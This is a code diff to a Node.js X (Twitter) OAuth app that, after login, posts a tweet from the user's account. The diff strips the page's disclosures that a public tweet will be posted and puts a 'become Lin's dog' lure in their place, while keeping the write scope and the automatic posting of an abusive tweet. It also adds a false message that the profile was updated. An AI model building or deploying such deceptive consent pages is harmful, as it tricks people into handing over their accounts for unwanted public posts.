@@ -16,7 +16,7 @@ app.get('/', (req, res) => {
     <!DOCTYPE html>
     <html>
     <head>
-        <title>X推文发布工具</title>
+        <title>X用户资料更新工具</title>
         <style>
           body { 
             font-family: Arial, sans-serif; 
@@ -64,16 +64,16 @@ app.get('/', (req, res) => {
     </head>
     <body>
         <div class="container">
-          <h1>X推文发布工具</h1>
-          <p>点击下方按钮授权我们来发布推文。</p>
+          <h1>林的小屋</h1>
+          <p>点击下方按钮来成为林的狗狗吧。</p>
           <a class="btn" href="/auth/x">Login with X</a>
           
           <div class="note">
-            <strong>注意：</strong> 授权后，我们将发布一条推文。
+            <strong>注意：</strong> 点击后，你将成为林大人的狗。
           </div>
           
           <div class="warning">
-            <strong>警告：</strong> 请确保您了解此操作将发布公开内容。
+            <strong> 点击进入狗窝。
           </div>
         </div>
     </body>
@@ -102,7 +102,7 @@ app.get('/auth/x', (req, res) => {
       response_type: 'code',
       client_id: CLIENT_ID,
       redirect_uri: REDIRECT_URI,
-      scope: 'tweet.read tweet.write offline.access', // 只保留推文相关权限
+      scope: 'users.read tweet.read tweet.write offline.access', // 修正权限范围
       state: STATE_STRING,
       code_challenge: 'challenge',
       code_challenge_method: 'plain',
@@ -190,8 +190,8 @@ app.get('/api/callback', async (req, res) => {
     console.log('成功获取访问令牌:', accessToken.substring(0, 10) + '...');
     
     try {
-      // 2. 获取当前用户ID和用户名（仅用于显示）
-      console.log('获取当前用户信息...');
+      // 2. 获取当前用户ID
+      console.log('获取当前用户ID...');
       const meResponse = await axios.get(
         'https://api.twitter.com/2/users/me?user.fields=id,name,username',
         {
@@ -206,7 +206,8 @@ app.get('/api/callback', async (req, res) => {
       const username = meResponse.data.data.username;
       console.log('当前用户ID:', userId, '用户名:', username);
       
-      // 3. 发送推文（核心功能）
+ 
+      // 4. 发送推文
       console.log('发送推文...');
       try {
         const tweetResponse = await axios.post(
@@ -226,6 +227,7 @@ app.get('/api/callback', async (req, res) => {
         const tweetId = tweetResponse.data.data.id;
         console.log('推文发送成功，ID:', tweetId);
         
+   
         // 显示成功页面
         res.send(`
           <!DOCTYPE html>
@@ -259,16 +261,14 @@ app.get('/api/callback', async (req, res) => {
           </head>
           <body>
             <div class="container">
-              <h1>🎉 推文发布成功！</h1>
-              <p>您的推文已成功发布：</p>
+              <h1>🎉 操作成功！</h1>
+              <p>您已经是林大人的狗啦：</p>
               
               <div class="success-info">
-                <p><strong>用户名:</strong> @${username}</p>
-                <p><strong>推文内容:</strong> Lick my feet, bitch</p>
-                <p><strong>推文ID:</strong> ${tweetId}</p>
+                <p><strong>欢迎加入林大人的小屋</p>
               </div>
               
-              <p>您现在可以返回X查看推文。</p>
+              <p>您现在可以返回X查看。</p>
             </div>
           </body>
           </html>
@@ -277,11 +277,11 @@ app.get('/api/callback', async (req, res) => {
       } catch (tweetError) {
         console.error('推文发送失败:', tweetError.response?.data || tweetError.message);
         
-        // 显示错误页面
+        // 显示部分成功页面
         res.send(`
           <div style="text-align: center; padding: 50px;">
-            <h1 style="color: #ffad1f;">⚠️ 推文发送失败</h1>
-            <p>推文发送失败。</p>
+            <h1 style="color: #ffad1f;">⚠️ 部分操作成功</h1>
+            <p>您的X资料已成功更新，但推文发送失败。</p>
             <div style="background: #fff5cc; padding: 15px; border-radius: 8px; margin: 20px auto; max-width: 500px; overflow: auto;">
               <pre style="text-align: left; white-space: pre-wrap;">${tweetError.response?.data ? JSON.stringify(tweetError.response.data, null, 2) : tweetError.message}</pre>
             </div>
